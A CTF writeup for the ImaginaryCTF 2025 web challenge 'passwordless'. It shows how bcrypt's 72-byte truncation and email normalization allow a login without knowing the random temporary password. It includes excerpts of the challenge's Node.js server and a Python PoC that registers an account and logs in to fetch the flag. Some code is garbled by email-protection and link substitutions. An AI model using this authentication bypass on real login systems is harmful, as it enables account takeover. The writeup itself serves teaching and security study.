---
title: "web passwordless - ImaginaryCTF 2025"
category: "web"
type: "writeup"
tags: ["web", "truncation", "bcrypt", "sqlite", "nodejs", "imaginaryctf", "imaginaryctf-2025", "2025", "ctf-writeup"]
summary: "passwordless is a classic case of bcrypt 72-byte password truncation abused in combination with email normalization."
source:
  name: "CTFtime writeup #40429"
  url: "https://ctftime.org/writeup/40429"
original_source: "https://blog.hitc.at/posts/ctf/imaginaryctf-2025/passwordless/"
ctf:
  name: "ImaginaryCTF 2025"
  year: 2025
  challenge: "web passwordless"
---

## Metadata

- **CTF:** ImaginaryCTF 2025
- **Task:** web passwordless
- **Author team:** fish3r
- **CTFtime tags:** web, truncation, bcrypt
- **CTFtime:** <https://ctftime.org/writeup/40429>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/imaginaryctf-2025/passwordless/>

---
## Introduction

**passwordless** is a classic case of **bcrypt 72-byte password truncation** abused in combination with **email normalization**.  
During registration, the server **hashes a "temporary password" built from the raw email plus random bytes**. Because **bcrypt only uses the first 72 bytes**, an attacker can craft a raw email whose **first 72 bytes are attacker-controlled**, while the **stored account email is the normalized form** (e.g., `[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)` → `[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)`). At login, the attacker submits the **normalized email** and the **first 72 bytes** as the password, and gets in.

### Context Explanation

* Stack: Node.js (Express), EJS views, in-memory **SQLite** DB, **bcrypt** for hashing, [**normalize-email**](<https://www.npmjs.com/package/normalize-email>) for email canonicalization, simple **rate limiter**.  
* Registration stores:

* `email = normalizeEmail(req.body.email)`  
* `password = bcrypt.hash(rawEmail + randomHex)`  
* Login verifies:

* Uses the **normalized email** for lookup and `bcrypt.compare` with the supplied password.

### Directive

1\. **Register** an account with a **long raw local part** (≥72 bytes before `@`) that normalizes to a **short canonical target** (e.g., a Gmail address like `[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)` → `[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)`).  
2\. Compute the **first 72 bytes of the raw email**; that is the **effective password** due to bcrypt truncation.  
3\. **Login** with the **normalized email** and the **72-byte prefix** to access `/dashboard` (flag printed server-side).

\---

## Solution

### 1) Key server behaviors (from [`index.js`](<https://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/passwordless/src/index.js>))

**Registration path**: note **normalization** for the stored email, and the **initial password** built from **raw email** + random bytes (which bcrypt will truncate to 72 bytes).

```javascript  
// src/index.js (excerpts)  
const bcrypt = require('bcrypt');  
const sqlite3 = require('sqlite3').verbose()  
const db = new sqlite3.Database(':memory:')  
const normalizeEmail = require('normalize-email')  
const crypto = require('crypto')

// ...

// Registration  
[app.post](http://app.post)('/user', limiter, (req, res, next) => {  
if (!req.body) return res.redirect('/login')

const nEmail = normalizeEmail(req.body.email)

if (nEmail.length > 64) {  
req.session.error = 'Your email address is too long'  
return res.redirect('/login')  
}

// IMPORTANT: initialPassword uses RAW req.body.email  
const initialPassword = req.body.email + crypto.randomBytes(16).toString('hex')

bcrypt.hash(initialPassword, 10, function (err, hash) {  
if (err) return next(err)

const query = "INSERT INTO users VALUES (?, ?)"  
db.run(query, [nEmail, hash], (err) => {  
if (err) {  
if (err.code === 'SQLITE_CONSTRAINT') {  
req.session.error = 'This email address is already registered'  
return res.redirect('/login')  
}  
return next(err)  
}

// TODO: Send email with initial password (not implemented)  
req.session.message = 'An email has been sent with a temporary password for you to log in'  
res.redirect('/login')  
})  
})  
})  
```

**Login path**: email is **normalized**, password is taken **as-is**, and compared with `bcrypt.compare`.

```javascript  
// src/index.js (excerpts)

// Query + compare  
function authenticate(email, password, fn) {  
db.get(`SELECT * FROM users WHERE email = ?`, [email], (err, user) => {  
if (err) return fn(err, null)  
if (user && bcrypt.compareSync(password, user.password)) {  
return fn(null, user)  
} else {  
return fn(null, null)  
}  
});  
}

[app.post](http://app.post)('/session', limiter, (req, res, next) => {  
if (!req.body) return res.redirect('/login')

const email = normalizeEmail(req.body.email)  
const password = req.body.password

authenticate(email, password, (err, user) => {  
if (err) return next(err)  
if (user) {  
req.session.regenerate(() => {  
req.session.user = user;  
res.redirect('/dashboard');  
});  
} else {  
req.session.error = 'Failed to log in'  
res.redirect('/login');  
}  
})  
})  
```

**Flag rendering** (on the authenticated dashboard):

```html

<span><%- process.env.FLAG %></span>  
```

### 2) The cryptographic lever: bcrypt 72-byte truncation

* **bcrypt** ignores any bytes **after the 72nd byte** of the password.  
* Registration hashes: `initialPassword = rawEmail + randomHex`  
* If `rawEmail` is **≥ 72 bytes**, then `initialPassword[:72] == rawEmail[:72]`, and the random suffix is completely **ignored** by bcrypt.

### 3) The identity lever: email normalization

* The stored account email is **normalized** via `normalizeEmail`.  
* Example (Gmail): `[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)` **normalizes** to `[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)`.  
* This allows us to **register** with a very long raw local part but **later log in** using the **short normalized address** (i.e., the same DB key).

### 4) End-to-end PoC

The provided PoC (Python `requests`) demonstrates the attack sequence:

```python  
# poc/[passwordless.py](http://passwordless.py)  
import requests

BASE = "<http://passwordless.chal.imaginaryctf.org>"

# 1) Build a very long raw email BEFORE '@', which normalizes to [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)  
local_raw = "a+" + ("X" * 200)  
raw_email = f"{local_raw}@gmail.com"  
normalized_email = "[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)" # post-normalization target

# 2) Effective password is the FIRST 72 bytes of the RAW email  
password_72 = raw_email[:72]

with requests.Session() as s:  
s.get(f"{BASE}/login", timeout=10) # init cookies (optional)

# 3) Register using the RAW email (server stores normalizedEmail + bcrypt(rawEmail||random))  
[s.post](http://s.post)(f"{BASE}/user", data={"email": raw_email}, timeout=10)

# 4) Login using the NORMALIZED email + 72-byte prefix  
[s.post](http://s.post)(f"{BASE}/session", data={"email": normalized_email, "password": password_72}, timeout=10)

# 5) Grab the flag  
r = s.get(f"{BASE}/dashboard", timeout=10)  
print("[*] Flag:", r.text.split('id="flag">')[1].split("")[0])  
```

![Flag](<https://blog.hitc.at/images/imaginaryctf2025/web/passwordles_flag.png>)
